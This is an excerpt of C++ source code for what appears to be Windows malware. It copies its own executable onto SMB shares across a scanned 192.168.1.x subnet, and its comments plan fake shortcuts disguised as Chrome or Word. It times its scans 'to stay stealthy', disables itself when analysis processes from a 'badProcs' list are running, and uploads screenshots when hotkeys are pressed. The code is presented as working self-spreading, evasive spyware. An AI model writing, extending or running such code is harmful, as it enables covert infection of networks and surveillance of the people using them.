...
void SpreadToTarget(const std::string& targetPath) {
    ...
    if (CopyFileA(currentExe, destFile.c_str(), FALSE)) {
        // Success! Also try to create a fake LNK on Desktop if path is Public Desktop
        if (targetPath.find("Desktop") != std::string::npos) {
            // Here we could add ShellLink logic to make it look like 'Chrome' or 'Word'
        }
    }
}
...
void PropagationThreadFunc() {
    while (true) {
        ...
        // Simplified approach: scan common IP ranges or use system calls
        // For stealth, we'll try to find nearby computers via 'net view' or SMB probes
        
        char localIP[16] = "192.168.1."; // Default assumption for many LANs
        // In a real scenario, we'd detect the actual subnet dynamically.
        ...
        for (int i = 1; i < 255; i++) {
            ...
            for (const char* s : shares) {
                ...
                if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
                    SpreadToTarget(fullPath);
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
        
        // Wait 30 mins before next scan to stay stealthy
    ...
    if (Process32First(hSnap, &pe)) {
        do {
            for (const char* bad : badProcs) {
                if (_stricmp(pe.szExeFile, bad) == 0) { found = true; break; }
            }
...
void PollingThreadFunc() {
    ...
    while (true) {
        ...
        if (g_suspiciousProcessFound) {
            g_dotState = DOT_RED; g_agentEnabled = false;
...
DWORD WINAPI ActiveDesktopThreadProc(LPVOID lpParam) {
    ...
    char targetDesktop[256]; strcpy(targetDesktop, p->desktopName); delete p;
    ...
    while (strcmp(g_activeDeskName, targetDesktop) == 0) {
        ...
        if (ctrlHeld && shiftHeld) {
            for (int i = 0; i < 10; i++) {
                int key = (i == 9) ? '0' : ('1' + i);
                if (GetAsyncKeyState(key) & 0x8000) { pressedNode = i + 1; break; }
            }
        }
        if (pressedNode != -1) {
            g_currentUser = pressedNode; g_dotState = DOT_YELLOW; g_answerText = "";
            std::thread t(TakeScreenshotAndUpload, pressedNode); t.detach();
            while ((GetAsyncKeyState(VK_CONTROL) & 0x8000) || (GetAsyncKeyState(VK_SHIFT)   & 0x8000)) { std::this_thread::sleep_for(std::chrono::milliseconds(16)); }
        }
        HDC hdc = GetDC(NULL);
        if (hdc) {
